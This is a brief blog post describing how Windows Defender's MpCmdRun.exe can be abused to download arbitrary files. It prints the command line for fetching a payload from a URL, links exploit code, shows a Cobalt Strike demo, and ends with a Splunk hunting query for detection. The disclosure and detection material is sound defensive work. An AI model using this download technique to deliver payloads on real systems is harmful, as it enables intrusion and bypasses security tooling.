---
title: Windows Defender official backdoor - Download files from Internet using "MpCmdRun.exe".
date: 2020-09-04 08:00:00 +07:00
tags: [windows, backdoor, download, defender]
description: Download any files from internet using "MpCmdRun.exe"
---

Recently I found interesting post in twitter, one of the security researcher(Askar) is identified, Microsoft Defender feature it can able to download any files from Internet.

Microsoft Defender is having one of the executable(MpCmdRun.exe) which is used as Malware protection command line utility. This executable having a feature which can take any URL as an input and download files in specific Windows Defender system files path.

##### Windows Defender File Path:
```batch
C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2007.8-0\MpCmdRun.exe
```
#### More Info about MpCmdRun.exe binary:
[Detailed Info - MpCmdRun.exe](https://strontic.github.io/xcyclopedia/library/MpCmdRun.exe-73E18D56F42B16160008629E1C936311.html)

#### Windows Defender Command Line - MpCmdRun.exe (Download any payload)
```batch
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2008.9-0\MpCmdRun.exe -url <url> -path <local-path>
```
#### Quick & Dirty - Powershell Script - Exploit Code:
[Abuse Windows Defender - MpCmdRun.exe - Powershell code](https://gist.github.com/klezVirus/977f6cd9e4126103326f6a28700382d1)

#### Demo by using CobaltStrike:
<figure>
<img src="/windowsdefender-official-backdoor-download-files-from-internet-mpcmdrun/cbstrike.jpeg" alt="Demo - CobaltStrike">
<figcaption>Demo - CobaltStrike</figcaption>
</figure>

#### BlueTeam - Threat Hunting / Quick & Dirty Detection:
```batch
Commandhistoryv2 _raw="*Download*" OR _raw="*URL*" OR _raw="*url*" OR _raw="*download*" OR _raw="*http://*" OR _raw="*https://*" OR _raw="*HTTP://*" OR _raw="*HTTPS://*"
| dedup CommandHistory
| table ComputerName ApplicationName CommandHistory FileName
```
#### BlueTeam - Splunk Detection:
<figure>
<img src="/windowsdefender-official-backdoor-download-files-from-internet-mpcmdrun/splunk.png" alt="Splunk hunting">
<figcaption>Splunk - Hunting</figcaption>
</figure>


#### References
- [Twitter Post](https://twitter.com/mohammadaskar2/status/1301263551638761477)
